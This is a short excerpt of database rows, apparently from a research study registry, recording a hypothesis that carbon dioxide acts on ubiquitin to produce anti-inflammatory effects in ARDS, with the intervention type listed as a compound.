	(8993,241,'hypothesis','\"Overall objective: to demonstrate that carbon dioxide interacts with the ubiquitin protein in vivo, and that this confers the anti-inflammatory effects of carbon dioxide in ARDS.\"','2022-03-31 13:23:59','2022-03-31 13:23:59'),
	(8994,241,'intervention_type','\"compound\"','2022-03-31 13:23:59','2022-03-31 13:23:59'),
